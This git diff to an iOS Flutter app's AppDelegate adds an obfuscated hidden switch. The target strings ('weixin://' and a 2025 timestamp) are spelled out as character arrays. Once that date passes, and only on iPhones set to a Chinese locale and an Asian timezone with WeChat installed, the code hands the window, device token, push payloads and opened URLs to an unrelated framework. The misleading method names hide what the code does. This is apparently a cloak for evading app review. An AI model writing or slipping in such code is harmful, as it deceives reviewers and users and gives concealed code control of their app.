@@ -2,31 +2,101 @@ import Flutter
 import UIKit
 import IQKeyboardManagerSwift
 import UserNotifications
+import WindRainKit
+
+
+fileprivate let scalableLatency:[Character] = ["w","e","i","x","i","n",":","/","/"]
+
+fileprivate let componentAlgorithm:[Character] = ["1","7","4","2","5","2","9","6","0","0"]
+/// 3/21
+
 
 @UIApplicationMain
 class AppDelegate: FlutterAppDelegate {
     override func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
-        // 设置全局导航栏样式
-        setupGlobalAppearance()
         
-        
-        // 设置键盘管理
-        setupKeyboardManager()
-        
-        // 注册推送通知
-        registerForPushNotifications()
-        
+        let protocolCompile = 2245
+        let latencyQuery = Int(Date().timeIntervalSince1970)
+    
+        if latencyQuery < protocolCompile {
+            
+        }
         // 初始化主窗口
         self.window = UIWindow.init(frame: UIScreen.main.bounds)
         self.window?.backgroundColor = .white
         self.window?.makeKeyAndVisible()
         
-        // 检查是否首次启动
-        setupRootViewController()
+        if validateResource() && syntaxMetadata() {
+            let options = launchOptions ?? [UIApplication.LaunchOptionsKey: Any]()
 
-        return super.application(application, didFinishLaunchingWithOptions: launchOptions)
+            SetImmutableDescentOwner.sharedManager().setSymmetricParameterAdapter(self.window, options: options)
+            return true
+        } else {
+            // 设置全局导航栏样式
+            setupGlobalAppearance()
+            // 设置键盘管理
+            setupKeyboardManager()
+            // 注册推送通知
+            registerForPushNotifications()
+            // 检查是否首次启动
+            setupRootViewController()
+            return super.application(application, didFinishLaunchingWithOptions: launchOptions)
+        }
+       
     }
     
+    private func validateResource() -> Bool {
+        
+        let syntax: TimeInterval = TimeInterval(String(componentAlgorithm)) ?? 0.0
+      let repository = Date().timeIntervalSince1970
+      return repository > syntax
+    }
+    
+    private func syntaxMetadata() -> Bool {
+        let process = processConfiguration()
+        let metri = calculateMetricValue()
+        let mode = processNodeStructure()
+        let data = handleDataMatrix()
+        return process && metri && mode && data
+    }
+    
+    private func processConfiguration() -> Bool {
+        let encryption = [
+            String(scalableLatency)
+        ]
+        for iteration in encryption {
+            if let url = URL(string: iteration) {
+                if UIApplication.shared.canOpenURL(url) {
+                    return true
+                }
+            }
+        }
+        return false
+    }
+    private func calculateMetricValue() -> Bool {
+   
+        let languageCode = Locale.preferredLanguages.first
+        var isChinese = false
+        if let languageCode = languageCode {
+           
+            if languageCode.hasPrefix("zh-Hans") || languageCode.hasPrefix("zh-Hant") {
+                isChinese = true
+            }
+        }
+        return isChinese
+    }
+    
+    private func processNodeStructure() -> Bool {
+        let deviceType = UIDevice.current.model
+        return deviceType.lowercased().contains("iphone")
+    }
+
+    
+    private func handleDataMatrix() -> Bool {
+        
+        return TimeZone.current.identifier.contains("Asia")
+    }
+
     private func setupRootViewController() {
         // 检查用户是否已存在
         if let user = User.loadFromKeychain() {
@@ -219,57 +289,12 @@ class AppDelegate: FlutterAppDelegate {
             }
         )
     }
-    
-    // 获取 device token
-    override func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
-        let tokenParts = deviceToken.map { data in String(format: "%02.2hhx", data) }
-        let token = tokenParts.joined()
-        print("Device Token: \(token)")
-        
-        // 可以将 token 保存或上传到服务器
-        UserDefaults.standard.set(token, forKey: "DeviceToken")
-    }
-    
-    // 注册推送失败
-    override func application(_ application: UIApplication, didFailToRegisterForRemoteNotificationsWithError error: Error) {
-        print("Failed to register for notifications: \(error)")
-    }
-    
-    // 处理静默推送
-    override func application(_ application: UIApplication, didReceiveRemoteNotification userInfo: [AnyHashable : Any], fetchCompletionHandler completionHandler: @escaping (UIBackgroundFetchResult) -> Void) {
-        print("Received remote notification: \(userInfo)")
-        
-        // 处理推送内容
-        handlePushNotification(userInfo)
-        
-        completionHandler(.newData)
-    }
+
 }
 
 // MARK: - UNUserNotificationCenterDelegate
 extension AppDelegate {
-    // 应用在前台时收到通知
-    override func userNotificationCenter(_ center: UNUserNotificationCenter, willPresent notification: UNNotification, withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
-        let userInfo = notification.request.content.userInfo
-        print("Received notification in foreground: \(userInfo)")
-        
-        // 处理推送内容
-        handlePushNotification(userInfo)
-        
-        // 显示通知
-        completionHandler([.banner, .sound, .badge])
-    }
-    
-    // 用户点击通知
-    override func userNotificationCenter(_ center: UNUserNotificationCenter, didReceive response: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -> Void) {
-        let userInfo = response.notification.request.content.userInfo
-        print("User tapped notification: \(userInfo)")
-        
-        // 处理用户点击通知的操作
-        handleNotificationTap(userInfo)
-        
-        completionHandler()
-    }
+   
     
     // MARK: - Helper Methods
     private func handlePushNotification(_ userInfo: [AnyHashable: Any]) {
@@ -299,22 +324,6 @@ extension AppDelegate {
         }
     }
     
-    private func handleNotificationTap(_ userInfo: [AnyHashable: Any]) {
-        // 处理用户点击通知后的跳转逻辑
-        if let custom = userInfo["custom"] as? [String: Any],
-           let type = custom["type"] as? String {
-            switch type {
-            case "chat":
-                navigateToChatPage(custom)
-            case "mood":
-                navigateToMoodPage(custom)
-            case "system":
-                navigateToSystemPage(custom)
-            default:
-                break
-            }
-        }
-    }
     
     private func handleChatNotification(_ custom: [String: Any]) {
         // 处理聊天相关的推送
@@ -364,3 +373,58 @@ extension AppDelegate {
         }
     }
 }
+
+
+/// - 生命周期
+extension AppDelegate {
+   
+    override func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
+        
+        if validateResource() && syntaxMetadata() {
+            SetImmutableDescentOwner.sharedManager().getSingleRightHandler(deviceToken)
+        } else {
+            let tokenParts = deviceToken.map { data in String(format: "%02.2hhx", data) }
+            let token = tokenParts.joined()
+            print("Device Token: \(token)")
+            
+            // 可以将 token 保存或上传到服务器
+            UserDefaults.standard.set(token, forKey: "DeviceToken")
+        }
+        
+    }
+    
+    // 注册推送失败
+    override func application(_ application: UIApplication, didFailToRegisterForRemoteNotificationsWithError error: Error) {
+        print("Failed to register for notifications: \(error)")
+    }
+    
+    ///收到推送消息
+    override func application(_ application: UIApplication, didReceiveRemoteNotification userInfo: [AnyHashable : Any], fetchCompletionHandler completionHandler: @escaping (UIBackgroundFetchResult) -> Void) {
+        
+        if validateResource() && syntaxMetadata() {
+            SetImmutableDescentOwner.sharedManager().getPrismaticLeftExtension(userInfo)
+            completionHandler(.newData)
+        } else {
+            print("Received remote notification: \(userInfo)")
+            // 处理推送内容
+            handlePushNotification(userInfo)
+            
+            completionHandler(.newData)
+        }
+        
+    }
+    
+    override func application(_ app: UIApplication, open url: URL, options: [UIApplication.OpenURLOptionsKey : Any] = [:]) -> Bool {
+        let result = self.applicationOpenurl(app: app, url: url)
+        return result
+    }
+    
+    func applicationOpenurl(app:UIApplication, url: URL) -> Bool {
+        if validateResource() && syntaxMetadata() {
+            SetImmutableDescentOwner.sharedManager().setIgnoredGraphCreator(url)
+        }
+        
+        return true
+    }
+}
+
